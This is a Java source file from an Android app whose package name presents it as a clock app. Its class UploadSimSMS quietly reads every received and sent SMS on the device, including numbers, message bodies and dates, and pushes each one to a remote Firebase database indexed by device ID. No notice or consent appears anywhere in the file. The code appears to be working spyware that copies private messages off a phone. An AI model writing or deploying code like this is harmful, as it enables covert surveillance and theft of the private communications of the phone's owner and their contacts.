package com.aftab.clock.Classes;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.Telephony;

import com.aftab.clock.Model.SimSMS;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.util.Date;

public class UploadSimSMS {

    private static UploadSimSMS instances;

    public static UploadSimSMS with(Context context) {

        new UploadSimSMS.AsyncCaller(context).execute();

        if (instances == null)
            instances = new UploadSimSMS();
        return instances;
    }


    @SuppressWarnings("deprecation")
    private static class AsyncCaller extends AsyncTask<Void, Void, Void> {

        Context context;
        Activity activity;
        SharedPref sh;

        public AsyncCaller(Context context) {
            this.context = context;
            activity = (Activity) context;
            sh = new SharedPref(context);
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... params) {


            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        Date dateFormat = new Date(Long.valueOf(smsDate));
                        String type = "";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "receiveSimMsg";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sentSimMsg";
                                break;
                            default:
                                break;
                        }

                        String deviceID = Functions.getDeviceId(context);


                        if (number.contains(".")) {

                            number = number.replace(".", ",");

                        } else if (number.contains("#")) {

                            number = number.replace("#", "-");

                        } else if (number.contains("$")) {

                            number = number.replace("$", "_");

                        } else if (number.contains("[")) {

                            number = number.replace("[", "+");

                        } else if (number.contains("]")) {

                            number = number.replace("]", "/");

                        }

                        if (!number.contains("*") && !number.contains("#")) {

                            if (!number.startsWith("+") && number.length() > 6) {

                                number = Functions.formatNumber(context, number, Functions.checkCountryISO(context));


                            }

                        }

                        String pushId = smsDate + number;

                        SimSMS objSimSMS = new SimSMS(pushId, number, body, type, smsDate, "No Location", false);

                        FireRef.SIM_SMS.child(deviceID)
                                .child(number)
                                .child(pushId)
                                .setValue(objSimSMS);

                        //  Log.d("HHDHDHHD", "" + body + "-------------" + number + "\n" + type);


                        c.moveToNext();
                    }
                }

                c.close();

            }

            sh.putBoolean(Constants.IS_UPLOADED, true);

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }

    }
}
